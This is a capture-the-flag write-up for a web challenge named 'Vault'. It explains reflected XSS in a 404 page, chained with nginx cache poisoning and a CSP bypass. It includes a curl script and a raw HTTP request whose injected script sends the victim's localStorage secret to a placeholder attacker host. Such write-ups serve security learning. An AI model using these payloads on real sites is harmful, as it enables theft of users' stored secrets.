# Vault

* Round: 33 (2023/04)
* Category: Web
* Points: 200
* Solves: 2

## Description

A simple but secure web app for storing secrets! If you find any vulnerability, please report it to admin!

## Solution

There is an obvious reflected XSS in 404 Not Found, but browser will always encode `<` and `>` in path so you can't get XSS triggered easily from browser. On the other hand, it is easily to make it send unencoded `<` and `>` using curl, combining it with nginx cache poisoning (cache key doesn't include query parameters) so you can get it to return HTML. You can use another 404 Not Found to construct valid JS to bypass CSP.

```bash
tok=$RANDOM
host="http://ictf2.maple3142.net:11223"
your_website="http://SOME_NGROK_URL"
curl "$host/$tok/*?*/;location='$your_website/?'+localStorage.secret//"
curl "$host/html$tok?<script/src=/$tok/*></script>"
echo ""
echo "Visit: $host/html$tok"
curl "$host/report" -G -d "url=$host/html$tok" -X POST
```

## Alternative Solution by @downgrade

```http
GET /<script/src="1;location=('http://YOUR_SERVER/'+localStorage.secret);//"></script>/../../../../../../lmao.html HTTP/1.1
Host: ictf2.maple3142.net
```

This use the fact that `$uri` is normalized path without query string, so it will be normalized to `/lmao.html`, therefore it will return the HTML as from cache too. CSP bypass is basically the same, expect you don't need to use another cache poisoning for that as it is possible to construct valid without encoded characters.
